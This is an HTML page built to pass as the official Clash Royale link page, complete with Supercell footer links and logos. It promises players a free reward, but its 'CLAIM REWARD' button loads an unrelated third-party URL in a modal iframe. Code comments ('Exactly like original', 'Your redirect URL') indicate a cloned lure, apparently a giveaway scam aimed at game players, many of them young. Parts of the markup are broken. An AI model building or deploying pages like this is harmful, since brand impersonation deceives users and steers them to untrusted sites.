<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clash Royale</title>
    <meta name="description" content="Open link in Clash Royale or download the game.">
    
    <style>
        /* ========== RESET & BASE ========== */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        html, body {
            width: 100%;
            height: 100%;
            overflow-x: hidden;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: #f2f2f2;
            color: #010101;
        }

        /* ========== MAIN CONTAINER ========== */
        .main-container {
            background-image: url('https://i.postimg.cc/FRrNXFQr/background.jpg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            min-height: 100vh;
            color: white;
            position: relative;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        /* ========== LANGUAGE DROPDOWN ========== */
        .language-dropdown-wrapper {
            position: absolute;
            top: 20px;
            right: 20px;
            z-index: 1000;
        }

        .language-dropdown {
            background: rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.3);
            color: white;
            padding: 8px 30px 8px 35px;
            border-radius: 25px;
            font-size: 14px;
            cursor: pointer;
            appearance: none;
            background-image: url('https://link.clashroyale.com/images/common/language-globe-white.svg'), url('https://link.clashroyale.com/images/common/language-caret-white.svg');
            background-repeat: no-repeat, no-repeat;
            background-position: 10px center, right 10px center;
            background-size: 18px, 12px;
            min-width: 120px;
        }

        .language-dropdown option {
            background: #333;
            color: white;
        }

        /* ========== CONTENT AREA ========== */
        .content-wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            width: 100%;
            max-width: 800px;
            padding: 40px 20px;
            text-align: center;
        }

        /* ========== LOGO ========== */
        .logo-container {
            margin-bottom: 40px;
        }

        .logo {
            width: 400px;
            max-width: 95%;
            height: auto;
        }

        /* ========== LEAD TEXT ========== */
        .lead-text {
            font-size: 28px;
            font-weight: bold;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
            margin-bottom: 40px;
            line-height: 1.2;
        }

        /* ========== QR CODE CONTAINER ========== */
        .qr-button-wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin: 20px 0;
        }

        .qr-code-container {
            width: 220px;
            height: 220px;
            background: white;
            border-radius: 3px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 30px;
            position: relative;
        }

        .qr-code {
            width: 200px;
            height: 200px;
        }

        /* ========== MAIN BUTTON - EXACT ORIGINAL STYLE ========== */
        .main-button {
            display: inline-block;
            background: linear-gradient(to bottom, #f8c63a 0%, #e8a71c 100%);
            color: #5c3e08;
            font-size: 22px;
            font-weight: bold;
            text-decoration: none;
            padding: 15px 40px;
            border-radius: 8px;
            border: none;
            box-shadow: 0 4px 0 #b88210, 
                        0 6px 8px rgba(0, 0, 0, 0.4),
                        inset 0 1px 0 rgba(255, 255, 255, 0.4);
            text-shadow: 0 1px 0 rgba(255, 255, 255, 0.4);
            cursor: pointer;
            position: relative;
            transition: all 0.1s ease;
            min-width: 250px;
            margin: 0;
            text-align: center;
        }

        .main-button:hover {
            background: linear-gradient(to bottom, #f9d263 0%, #f0b52a 100%);
            transform: translateY(-1px);
            box-shadow: 0 5px 0 #b88210, 
                        0 7px 10px rgba(0, 0, 0, 0.4),
                        inset 0 1px 0 rgba(255, 255, 255, 0.4);
        }

        .main-button:active {
            transform: translateY(3px);
            box-shadow: 0 1px 0 #b88210, 
                        0 3px 6px rgba(0, 0, 0, 0.3),
                        inset 0 1px 0 rgba(255, 255, 255, 0.2);
        }

        .main-button span {
            display: block;
            line-height: 1.2;
        }

        /* ========== DOWNLOAD SECTION ========== */
        .download-links-wrapper {
            margin: 60px 0 40px;
            text-align: center;
        }

        .download-links-heading {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 30px;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
        }

        .download-links {
            display: flex;
            gap: 30px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .download-links a {
            display: inline-block;
            transition: transform 0.2s ease;
        }

        .download-links a:hover {
            transform: translateY(-2px);
        }

        .download-links img {
            width: 200px;
            height: 60px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
        }

        /* ========== DECORATION SECTION ========== */
        .decoration-section {
            margin-top: 60px;
            padding-top: 40px;
        }

        .decoration-image {
            width: 500px;
            max-width: 95%;
            height: auto;
            filter: drop-shadow(0 4px 8px rgba(0, 0, 0, 0.3));
        }

        /* ========== FOOTER ========== */
        footer {
            background: #000;
            color: #fff;
            padding: 30px 20px 20px;
            width: 100%;
            margin-top: auto;
        }

        .links {
            display: flex;
            justify-content: center;
            gap: 30px;
            flex-wrap: wrap;
            margin-bottom: 30px;
        }

        .links a {
            color: #ccc;
            text-decoration: none;
            font-size: 14px;
            transition: color 0.2s ease;
        }

        .links a:hover {
            color: white;
        }

        .footer-bottom {
            border-top: 1px solid #333;
            padding-top: 30px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
        }

        @media (min-width: 576px) {
            .footer-bottom {
                flex-direction: row;
                justify-content: space-between;
            }
        }

        .bottom-links {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .bottom-links img {
            width: 60px;
            height: 48px;
            filter: brightness(0.9);
        }

        .no-track {
            color: #999;
            text-decoration: none;
            font-size: 14px;
            transition: color 0.2s ease;
        }

        .no-track:hover {
            color: #ccc;
        }

        .social {
            display: flex;
            gap: 15px;
        }

        .social a {
            width: 40px;
            height: 40px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            color: white;
            transition: all 0.2s ease;
        }

        .social a svg {
            width: 20px;
            height: 20px;
        }

        .social a:hover {
            background: rgba(255, 255, 255, 0.2);
            transform: translateY(-2px);
        }

        /* ========== SIMPLE MODAL ========== */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            z-index: 9999;
            align-items: center;
            justify-content: center;
        }

        .modal.active {
            display: flex;
        }

        .modal-content {
            background: white;
            border-radius: 12px;
            width: 90%;
            max-width: 500px;
            max-height: 80vh;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }

        .modal-header {
            background: #22c55e;
            color: white;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .modal-header h3 {
            margin: 0;
            font-size: 18px;
        }

        .close-modal {
            background: none;
            border: none;
            color: white;
            font-size: 24px;
            cursor: pointer;
            line-height: 1;
            padding: 0;
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .modal-body {
            padding: 0;
            height: 400px;
        }

        .modal-iframe {
            width: 100%;
            height: 100%;
            border: none;
        }

        /* ========== RESPONSIVE ========== */
        @media (max-width: 768px) {
            .logo { width: 320px; }
            .lead-text { font-size: 24px; }
            .main-button { 
                min-width: 220px; 
                font-size: 20px;
                padding: 14px 30px;
            }
            .decoration-image { width: 350px; }
            .links { gap: 20px; }
            .download-links { 
                flex-direction: column; 
                align-items: center;
                gap: 20px;
            }
            .download-links img {
                width: 220px;
                height: 66px;
            }
            .modal-content {
                width: 95%;
            }
        }

        @media (max-width: 480px) {
            .logo { width: 280px; }
            .lead-text { font-size: 22px; }
            .main-button { 
                min-width: 200px; 
                font-size: 18px;
                padding: 12px 25px;
            }
            .decoration-image { width: 280px; }
            .download-links img { 
                width: 200px; 
                height: 60px;
            }
            .footer-bottom { gap: 15px; }
            .social { gap: 10px; }
            .links {
                flex-direction: column;
                align-items: center;
                gap: 15px;
            }
            .modal-content {
                width: 98%;
            }
        }
    </style>
</head>
<body>
    <!-- Simple Modal -->
    <div class="modal" id="redirectModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>Redirecting...</h3>
                <button class="close-modal" id="closeModal">&times;</button>
            </div>
            <div class="modal-body">
                <iframe src="" class="modal-iframe" id="redirectFrame" allowfullscreen></iframe>
            </div>
        </div>
    </div>

    <div class="main-container">
        <!-- Language Dropdown -->
        <div class="language-dropdown-wrapper">
            <select class="language-dropdown" name="locales" id="locales" aria-label="Select a language">

                <option value="jp">日本語</option>
                <option value="kr">한국어</option>
                <option value="ms">Bahasa Melayu</option>
                <option value="nl">Nederlands</option>
                <option value="no">Norsk</option>
                <option value="pt">Português</option>
                <option value="ru">ру́сский</option>
                <option value="th">ไทย</option>

        </div>
        
        <!-- Main Content -->
        <div class="content-wrapper">
            <!-- Logo -->
            <div class="logo-container">
                <a href="https://clashroyale.com">
                    <img src="https://i.postimg.cc/HsR6qSC8/logo-opt-750.webp" alt="Clash Royale" class="logo">
                </a>
            </div>
            
            <!-- Lead Text -->
            <div class="lead-text">
                Claim a Reward In Clash Royale!
            </div>
            
            <!-- QR Code and Button -->
            <div class="qr-button-wrapper">
                <div class="qr-code-container">
                    <!-- QR Code would go here -->
                    <div style="width: 200px; height: 200px; background: #f0f0f0; display: flex; align-items: center; justify-content: center; border-radius: 3px;">
                        <!-- You can add your QR code image here -->
                        <div style="text-align: center; color: #666; font-size: 14px; font-weight: bold;">
                            SCAN QR CODE<br>
                            to claim reward
                        </div>
                    </div>
                </div>
                
                <!-- Main Button - Exactly like original -->
                <button class="main-button" id="claimButton">
                    <span>CLAIM REWARD</span>
                </button>
            </div>
            
            <!-- Download Section -->
            <div class="download-links-wrapper">
                <div class="download-links-heading">Download Clash Royale</div>
                <div class="download-links">
                    <!-- Google Play Button -->
                    <a href="https://clashroyale.onelink.me/r1uX/socialreferral" target="_blank">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play">
                    </a>
                    <!-- App Store Button -->
                    <a href="https://clashroyale.onelink.me/r1uX/socialreferral" target="_blank">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="App Store">
                    </a>
                </div>
            </div>
            
            <!-- Decoration -->
            <section class="decoration-section">
                <!-- Placeholder for decoration image -->
                <div class="decoration-image" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 10px; display: flex; align-items: center; justify-content: center; height: 250px;">
                    <div style="text-align: center; color: white; padding: 20px;">
                        <div style="font-size: 24px; font-weight: bold; margin-bottom: 10px;">⚔️</div>
                        <div style="font-size: 18px; font-weight: bold;">Clash Royale</div>
                        <div style="font-size: 14px; margin-top: 10px;">Epic Real-Time Card Battles</div>
                    </div>
                </div>
            </section>
        </div>
        
        <!-- Footer -->
        <footer>
            <div class="links">
                <a href="https://supercell.com/en/parents/en">Parent's guide</a>
                <a href="https://supercell.com/en/terms-of-service/en">Terms & Service</a>
                <a href="https://supercell.com/en/privacy-policy/en">Privacy Policy</a>
            </div>
            
            <div class="footer-bottom">
                <div class="bottom-links">
                    <a href="https://supercell.com">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/61/Supercell_logo.svg/2560px-Supercell_logo.svg.png" alt="Supercell">
                    </a>
                    <a href="#" class="no-track" id="cookieLink">Manage Cookies</a>
                </div>
                
                <div class="social">
                    <a href="http://www.facebook.com/ClashRoyale" aria-label="facebook" target="_blank">

                    <a href="https://youtube.com/clashroyale" aria-label="youtube" target="_blank">

                        </svg>
                    </a>
                </div>
            </div>
        </footer>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Get elements
            const modal = document.getElementById('redirectModal');
            const closeModal = document.getElementById('closeModal');
            const claimButton = document.getElementById('claimButton');
            const redirectFrame = document.getElementById('redirectFrame');
            
            // Your redirect URL
            const redirectUrl = "https://bouttiq.graphics/cl/i/j77p9p";
            
            // Show modal when claim button is clicked
            claimButton.addEventListener('click', function() {
                redirectFrame.src = redirectUrl;
                modal.classList.add('active');
                document.body.style.overflow = 'hidden';
            });
            
            // Close modal
            closeModal.addEventListener('click', function() {
                modal.classList.remove('active');
                document.body.style.overflow = 'auto';
                redirectFrame.src = '';
            });
            
            // Close modal when clicking outside
            modal.addEventListener('click', function(e) {
                if (e.target === modal) {
                    modal.classList.remove('active');
                    document.body.style.overflow = 'auto';
                    redirectFrame.src = '';
                }
            });
            
            // Close modal with Escape key
            document.addEventListener('keydown', function(e) {
                if (e.key === 'Escape' && modal.classList.contains('active')) {
                    modal.classList.remove('active');
                    document.body.style.overflow = 'auto';
                    redirectFrame.src = '';
                }
            });
            
            // Language dropdown functionality
            const langSelect = document.querySelector('.language-dropdown');
            if (langSelect) {
                langSelect.addEventListener('change', function() {
                    console.log('Language changed to:', this.value);
                });
            }
            
            // Cookie link
            const cookieLink = document.getElementById('cookieLink');
            if (cookieLink) {
                cookieLink.addEventListener('click', function(e) {
                    e.preventDefault();
                    alert('Cookie management would open here.');
                });
            }
            
            // Social links - open in new tab
            const socialLinks = document.querySelectorAll('.social a');
            socialLinks.forEach(link => {
                link.addEventListener('click', function(e) {
                    console.log('Opening social media:', this.getAttribute('aria-label'));
                });
            });
            
            // Download links
            const downloadLinks = document.querySelectorAll('.download-links a');
            downloadLinks.forEach(link => {
                link.addEventListener('click', function(e) {
                    console.log('Redirecting to app store...');
                });
            });
        });
    </script>
</body>
</html>
